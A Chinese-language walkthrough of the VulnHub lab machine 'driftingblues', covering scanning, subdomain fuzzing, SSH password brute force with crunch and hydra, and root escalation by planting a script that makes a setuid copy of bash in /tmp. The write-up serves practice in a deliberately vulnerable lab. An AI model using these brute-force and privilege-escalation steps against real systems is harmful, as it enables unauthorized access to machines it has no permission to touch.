---
title: driftingblues VulnHub Walkthrough
date: 2021-10-12 16:24:52
categories:
- 渗透测试
tags:
- VulnHub
---

## driftingblues VulnHub Walkthrough

### 信息收集

#### 主机探测

```
arp-scan -l
```

![](https://i.loli.net/2021/10/12/OmNE8evaC2VQzZc.png)

#### 端口扫描

```
nmap -sC -sV -p- 192.168.62.172
```

![](https://i.loli.net/2021/10/12/9LTWKF2Irw3bBn4.png)

只开放了22和80端口，只能先访问80端口看一下有没有什么信息

![](https://i.loli.net/2021/10/12/3aTXBh7Au61snxe.png)

好像没什么东西，扫了目录也没什么信息

![](https://i.loli.net/2021/10/12/89FHODkPsiIKq3A.png)

右键查看源码，看到了一串疑似base64编码的字符串，到在线网站上转换一下，这应该是一个路径

![](https://i.loli.net/2021/10/12/F4z37IMB6HRTbN8.png)

访问一下，这个很明显了，到在线的ook!解密网站解密一下

![](https://i.loli.net/2021/10/12/f3Y5qmlHkdy4UO2.png)

是一个提示，应该是要修改host文件

![](https://i.loli.net/2021/10/12/2A8K7SIUoW3ZYCJ.png)

在主页上可以看到一个域名，尝试添加到host再访问

![](https://i.loli.net/2021/10/12/yrY1VEOUn7ZNJuf.png)

![](https://i.loli.net/2021/10/12/m8XTnM4pqJRSxYI.png)

重新扫目录还是没有发现，那就试试爆破子域名

```
wfuzz -u driftingblues.box -w /home/colin/文档/fuzzDicts/subdomainDicts/main.txt -H "Host:FUZZ.driftingblues.box" --hw 570
```

![](https://i.loli.net/2021/10/12/IhLMdEA75BqWY8J.png)

直接访问解析不了，需要再修改一下host

![](https://i.loli.net/2021/10/12/9HeMXPp4nxUc5T3.png)

访问一下

![](https://i.loli.net/2021/10/12/rQZJMdo6itON41X.png)

再扫一次目录，发现有robots.txt

![](https://i.loli.net/2021/10/12/h8NRS47k5FwcyQP.png)

访问一下，看到给了一些路径

![](https://i.loli.net/2021/10/12/hqH8zidLMpy2B4b.png)

查看ssh_cred.txt，给了提示

![](https://i.loli.net/2021/10/12/lO2CwcisZyFhX7Q.png)

### 漏洞利用

ssh登录的密码是`1mw4ckyyucky*`，目前还缺一位数字，一共十个可能的密码，先生成一下

```
crunch 13 13 -t 1mw4ckyyucky% > pass
```

看一下我们生成的密码集合

![](https://i.loli.net/2021/10/12/LKM18PeBjnQ3EmN.png)

接下来尝试爆破ssh登录密码，根据前面访问`test.driftingblues.box`的提示，用户名应该是`eric`

```
hydra -l eric -P pass ssh://192.168.62.172
```

![](https://i.loli.net/2021/10/12/DEn1wX8sbvx3KPy.png)

找到密码了，直接登录ssh

![](https://i.loli.net/2021/10/12/tR6dFViCTaYM3gk.png)

直接获取第一个flag

<img src="https://i.loli.net/2021/10/12/R6CWvfVqErO29Az.png" style="zoom:67%;" />

### 提权

```
uname -a
find / -perm -u=s -type f 2>/dev/null
getcap -r  / 2>/dev/null
```

看了一遍都没有什么发现，只能看一看有没有什么其他可以利用的地方

在备份目录下有个backup.sh，看一下内容

![](https://i.loli.net/2021/10/12/y8jaFm2eGTYUiXo.png)

有一个sudo执行的/tmp/emergency，但是tmp目录下是没有这个文件的，所以应该通过新建文件来提权

思路是这样，但还是不知道怎么操作，只能看看别人的walkthrough了

```
echo 'cp /bin/bash /tmp/getroot; chmod +s /tmp/getroot' > /tmp/emergency
#系统执行backup.up，以sudo执行emergency，会将/bin/bash复制到tmp，并赋予执行权限
chmod +x emergency
./getroot -p
```

![](https://i.loli.net/2021/10/12/jWGusDP8aTNwCgS.png)

![](https://i.loli.net/2021/10/12/lRnyG9txiQKuYW5.png)

现在可以获取第二个flag了

<img src="https://i.loli.net/2021/10/12/bWHGwDhZx1cTntf.png" style="zoom:67%;" />

> 参考：
>
> https://blog.csdn.net/weixin_45922278/article/details/115277255
